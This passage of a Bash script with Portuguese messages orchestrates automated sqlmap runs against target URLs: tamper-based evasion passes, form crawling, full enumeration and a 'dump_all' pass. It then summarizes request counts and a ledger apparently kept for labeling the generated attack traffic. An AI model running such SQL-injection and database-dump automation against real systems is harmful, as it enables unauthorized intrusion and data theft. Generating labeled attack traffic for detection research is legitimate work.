  for p in "${!PASS_NAMES[@]}"; do
    name="${PASS_NAMES[$p]}"
    method_selector="${PASS_METHODS[$p]}"
    dbms_selector="${PASS_DBMS[$p]}"
    flag_string="${PASS_FLAGS[$p]}"
    tamper_chain="${PASS_TAMPERS[$p]}"

    if [[ "$name" == "06_forms_crawl" && "$RUN_CRAWL" != "1" ]]; then
      record_skipped "$target_index" "$method" "$target" "$data" "$name" "crawl_desativado"
      continue
    fi

    if [[ -n "$tamper_chain" && "$RUN_TAMPERS" != "1" ]]; then
      record_skipped "$target_index" "$method" "$target" "$data" "$name" "tampers_desativados"
      continue
    fi

    if ! method_applies "$method_selector" "$method"; then
      record_skipped "$target_index" "$method" "$target" "$data" "$name" "metodo_incompativel"
      continue
    fi

    if ! dbms_applies "$dbms_selector"; then
      record_skipped "$target_index" "$method" "$target" "$data" "$name" "dbms_incompativel"
      continue
    fi

    if ! tamper_chain_available "$tamper_chain"; then
      record_skipped "$target_index" "$method" "$target" "$data" "$name" "tamper_ausente:$tamper_chain"
      continue
    fi

    IFS=' ' read -r -a pass_flags <<< "$flag_string"
    run_pass "$target_index" "$method" "$target" "$data" "$name" "$tamper_chain" "${pass_flags[@]}"
  done

  if [[ "$RUN_ENUM" == "1" ]]; then
    run_pass "$target_index" "$method" "$target" "$data" "90_enumeracao_completa" "" "${ENUM_FLAGS[@]}"
  else
    record_skipped "$target_index" "$method" "$target" "$data" "90_enumeracao_completa" "enumeracao_desativada"
  fi

  if [[ "$RUN_DUMP" == "1" ]]; then
    if [[ "$RUN_ENUM" != "1" && "$REUSE_SESSION_FOR_ENUM" == "1" ]]; then
      warn "99_dump_all sem 90_enumeracao: sem sessão prévia, a detecção será refeita."
    fi
    run_pass "$target_index" "$method" "$target" "$data" "99_dump_all" "" "${DUMP_FLAGS[@]}"
  else
    record_skipped "$target_index" "$method" "$target" "$data" "99_dump_all" "dump_desativado"
  fi
done

# -------------------------------- RESUMO ------------------------------------
echo
echo "============================================================================="
echo "RESUMO DA EXECUÇÃO ($RUN_ID)"
echo "============================================================================="
printf 'passes executados .........: %s\n' "$TOTAL_PASSES"
printf 'passes pulados ............: %s\n' "$TOTAL_SKIPPED"
printf 'requisições enviadas ......: %s\n' "$TOTAL_REQ"
printf 'logs do sqlmap ............: %s\n' "$(human "$TOTAL_LOG")"
printf 'dump de tráfego ...........: %s\n' "$(human "$TOTAL_TRF")"
echo
printf 'estimativa de access.log ..: ~%s linhas\n' "$TOTAL_REQ"
printf 'a ~200 B por linha ........: ~%s\n' "$(human "$((TOTAL_REQ * 200))")"
echo
echo "Requisições por passe:"
awk -F '\t' '
  NR > 1 && $20 == "executed" { requests[$6] += $13 }
  END { for (pass in requests) printf "  %-30s %10d\n", pass, requests[pass] }
' "$LEDGER" | sort

echo
echo "Requisições por método:"
awk -F '\t' '
  NR > 1 && $20 == "executed" { requests[$3] += $13 }
  END { for (method in requests) printf "  %-10s %10d\n", method, requests[method] }
' "$LEDGER" | sort

echo
echo "Requisições por modo de User-Agent:"
awk -F '\t' '
  NR > 1 && $20 == "executed" { requests[$17] += $13 }
  END { for (mode in requests) printf "  %-10s %10d\n", mode, requests[mode] }
' "$LEDGER" | sort

echo
echo "Códigos de saída:"
awk -F '\t' '
  NR > 1 && $20 == "executed" { codes[$12]++ }
  END { for (code in codes) printf "  rc=%-6s %10d passes\n", code, codes[code] }
' "$LEDGER" | sort

echo
echo "[✓] Ledger para rotulagem: $LEDGER"
echo "[✓] Logs: $OUTDIR/logs"
echo "[✓] Tráfego HTTP: $OUTDIR/traffic"
echo "[✓] Comandos reproduzíveis: $OUTDIR/meta/commands"
